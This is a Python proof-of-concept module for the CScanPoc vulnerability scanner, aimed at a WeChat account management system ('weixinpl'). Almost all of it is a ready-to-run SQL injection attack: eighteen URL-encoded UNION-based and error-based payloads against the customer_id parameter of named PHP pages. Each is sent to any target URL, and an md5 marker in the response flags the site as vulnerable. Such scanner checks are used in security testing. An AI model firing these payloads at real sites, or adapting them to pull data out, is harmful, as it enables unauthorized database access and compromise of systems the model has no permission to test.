# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WeixiManager_0001'  # 平台漏洞编号，留空
    name = '微信管理系统存在sql注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-22'  # 漏洞公布时间
    desc = '''
        某微信公众帐号管理系统(微网站)存在后门目测受影响300多个站点。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '微信管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ba7f8e65-a8f9-4f99-bf91-83d7dc459f9d'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref http://wooyun.org/bugs/wooyun-2015-0109221
            payloads = [
                '/weixinpl/huodong/show_huodong.php?customer_id=-1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cmd5%280x22%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20',
                '/weixinpl/miaosha/show_miaosha.php?customer_id=-1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cmd5%280x22%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20',
                '/weixinpl/order_car/show_car.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/wish/show_wish.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/online/show_online.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/xitie_new/show_xitie.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/feedback/feedback.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/recruit/show_recruit.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/insurance/show_insurance.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/guahao/show_guahao.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/car_tips/index.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/guide/show_guide.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/sign/show_sign.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/new_dingcan/catering.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/order_baoxian/show_order.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/zhengwu/zhengwu.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/training/training.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29',
                '/weixinpl/booth/show_booth.php?customer_id=-1%20or%20%28SELECT%203442%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x22%29%2C%28SELECT%20%28ELT%283442%3D3442%2C1%29%29%29%2C0x7171717071%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                #code, head,res, errcode, _ = curl.curl2(url,payload)
                r = requests.get(verify_url)

                if 'b15835f133ff2e27c7cb28117bfae8f4' in r.text:
                    # security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
